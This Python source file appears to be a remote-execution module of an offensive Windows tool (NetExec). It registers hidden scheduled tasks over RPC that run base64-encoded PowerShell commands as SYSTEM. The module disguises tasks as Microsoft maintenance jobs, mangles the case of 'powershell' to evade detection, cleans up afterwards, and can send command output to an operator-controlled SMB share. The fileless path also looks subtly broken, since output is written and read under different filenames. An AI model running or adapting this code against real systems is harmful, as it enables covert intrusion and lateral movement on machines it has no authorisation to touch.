import os
import base64
import contextlib
import random
import uuid
from datetime import datetime, timedelta
from time import sleep

from impacket.dcerpc.v5 import tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY

from nxc.helpers.misc import gen_random_string
from nxc.helpers.rpc import NXCRPCConnection
from nxc.paths import TMP_PATH


class TSCH_EXEC:
    def __init__(self, connection, logger=None, tries=None, share=None,
                 # These options are used by the schtask_as module, except the run_task_as
                 # that defaults to NT AUTHORITY\System user (SID S-1-5-18) if not specified
                 run_task_as="S-1-5-18", run_cmd=None, output_filename=None, task_name=None, output_file_location=None):
        self.__connection = connection
        self.logger = logger
        self.__tries = tries
        self.__share = share
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__output_filename = None

        # Optional args for finetuning the task execution, e.g. used in nxc/modules/schtask_as.py
        self.task_name = task_name if task_name else self.get_legitimate_task_name()
        self.run_task_as = run_task_as
        self.run_cmd = run_cmd
        self.output_filename = output_filename
        self.output_file_location = output_file_location

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    # ----------------------------------------------------------------------
    def get_legitimate_task_filename(self):
        """Generate a more plausible task scheduler related filename"""
        task_prefixes = ["TS", "Task", "Microsoft-Task", "Windows-Task",
                         "TaskManager", "Schedule"]
        extensions = ["wdb"]

        prefix = random.choice(task_prefixes)
        extension = random.choice(extensions)

        formats = [
            f"{prefix}_{uuid.uuid4().hex[:8].upper()}.{extension}",
            f"{prefix}-{datetime.now().strftime('%Y%m%d')}.{extension}",
            f"Microsoft-{prefix}-{gen_random_string(6).upper()}.{extension}",
        ]
        return random.choice(formats)

    def get_end_boundary(self):
        """Generate an end boundary timestamp (+1 day)."""
        return datetime.now() + timedelta(days=1)

    # ----------------------------------------------------------------------
    def get_legitimate_task_name(self):
        """Generate a more plausible scheduled task name"""
        vendors = ["Microsoft", "Windows", "System"]
        components = ["Maintenance", "Update", "Diagnostics", "Performance",
                      "Security", "Network"]
        actions = ["Task", "Manager", "Monitor", "Service", "Scheduler"]

        formats = [
            f"{random.choice(vendors)}-{random.choice(components)}-{random.choice(actions)}",
            f"{random.choice(vendors)}{random.choice(components)}",
            f"{random.choice(components)}{random.choice(actions)}",
        ]
        task_name = random.choice(formats)
        if random.choice([True, False]):
            task_name = f"{task_name}-{uuid.uuid4().hex[:8].upper()}"
        return task_name

    # ----------------------------------------------------------------------
    def gen_xml(self, command, fileless=False):
        safer_command = command

        if "powershell" in command.lower() and ("-command" in command.lower() or "-c " in command.lower()):
            self.logger.debug("PowerShell command detected, keeping as is (user requested)")
            safer_command = command.replace("powershell", "poWerSheLL").replace("POWERSHELL", "PoWeRsHeLL")

        valid_system_filename_prefixes = [
            "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-",
            "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-",
        ]
        system_prefix = random.choice(valid_system_filename_prefixes)
        random_date = datetime.now().strftime("%Y%m%d")
        random_suffix = gen_random_string(4)
        legit_filename = f"{system_prefix}{random_date}-{random_suffix}.log"

        task_filename = self.get_legitimate_task_filename()
        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
        self.logger.debug(f"Creation time: {current_time}")

        # Store the SMB-relative path (for getFile/deleteFile against the share)
        self.__output_filename = f"\\ProgramData\\{task_filename}"
        # Full Windows path for use inside the scheduled task command
        output_windows_path = f"C:{self.__output_filename}"

        if self.__retOutput:
            if fileless:
                local_ip = self.__connection.local_ip
                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__connection.smb_share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
            else:
                ps_cmd = f"[IO.File]::WriteAllText('{output_windows_path}', (& {{ {safer_command} }}))"
        else:
            # Optional obfuscation: randomize cmd path and args
            random_cmd_path = [
                "cmd", "cmd.exe",
                "C:\\Windows\\System32\\cmd",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\..\\System32\\cmd.exe",
            ]
            random_cmd_arg = ["/c", "/C", "/Q /c", "/F:ON /c"]
            ps_cmd = f"{random.choice(random_cmd_path)} {random.choice(random_cmd_arg)} {safer_command}"

        b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()

        return f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{current_time}</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Scheduled system maintenance and diagnostics task</Description>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>{self.run_task_as}</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>
      <Arguments>-EncodedCommand {b64}</Arguments>
    </Exec>
  </Actions>
</Task>"""

    # ----------------------------------------------------------------------
    def execute_handler(self, command, fileless=False):
        dce = NXCRPCConnection(self.__connection).connect(r"\atsvc", tsch.MSRPC_UUID_TSCHS, auth_level=RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        xml = self.gen_xml(command, fileless)
        self.logger.debug(f"Using task name: {self.task_name}")
        self.logger.info(f"Creating task: {self.task_name}")

        try:
            tsch.hSchRpcRegisterTask(dce, f"\\{self.task_name}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            self.logger.debug("Task registered successfully")
        except Exception as e:
            if hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            with contextlib.suppress(Exception):
                dce.disconnect()
            return

        # Win2025+ (build 26100): RegistrationTrigger does not start the task over remote TSCH.
        if self.__connection.server_os_build and int(self.__connection.server_os_build) >= 26100:
            try:
                tsch.hSchRpcRun(dce, f"\\{self.task_name}")
            except tsch.DCERPCSessionError as e:
                self.logger.debug(f"hSchRpcRun returned: {e}")

        done = False
        while not done:
            self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{self.task_name}")
            try:
                resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{self.task_name}")
            except tsch.DCERPCSessionError as e:
                if e.error_code == 0x00041303:
                    sleep(2)
                    continue
                self.logger.fail(f"Error retrieving task last run info: {e}")
                break
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
            else:
                sleep(2)

        self.logger.info(f"Deleting task \\{self.task_name}")
        tsch.hSchRpcDelete(dce, f"\\{self.task_name}")

        if self.__retOutput:
            if fileless:
                self._retrieve_fileless_output()
            else:
                self._retrieve_output()

        try:
            self.logger.info(f"Deleting task: {self.task_name}")
            tsch.hSchRpcDelete(dce, f"\\{self.task_name}")
        except Exception as e:
            self.logger.debug(f"Error deleting task: {e!s}")

        with contextlib.suppress(Exception):
            dce.disconnect()

    def _retrieve_output(self):
        tries = 1
        # Give the command a bit of time to execute before we try to read the output
        sleep(0.4)
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
                self.__connection.conn.getFile(self.__share, self.__output_filename, self.output_callback)
                break
            except Exception as e:
                if tries >= self.__tries:
                    self.logger.fail("ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                    break
                if "STATUS_BAD_NETWORK_NAME" in str(e):
                    self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                    break
                elif "STATUS_VIRUS_INFECTED" in str(e):
                    self.logger.fail("Command did not run because a virus was detected")
                    break
                if "STATUS_SHARING_VIOLATION" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output_filename} is still in use with {self.__tries - tries} tries left, retrying...")
                    tries += 1
                    sleep(1)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output_filename} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying...")
                    tries += 10
                    sleep(1)
                else:
                    self.logger.debug(f"Exception when trying to read output file: {e!s}. {self.__tries - tries} tries left, retrying...")
                    tries += 1
                    sleep(1)
        try:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
            self.__connection.conn.deleteFile(self.__share, self.__output_filename)
        except Exception:
            pass

    def _retrieve_fileless_output(self):
        max_attempts = 10
        attempts = 0
        while attempts < max_attempts:
            try:
                file_path = os.path.join(TMP_PATH, "nxc_hosted", os.path.basename(self.__output_filename))
                self.logger.debug(f"Looking for fileless output at: {file_path}")
                with open(file_path) as output:
                    self.output_callback(output.read())
                try:
                    os.remove(file_path)
                    self.logger.debug(f"Removed fileless output file: {file_path}")
                except OSError as e:
                    self.logger.debug(f"Could not remove file {file_path}: {e}")
                break
            except OSError:
                sleep(1)
                attempts += 1
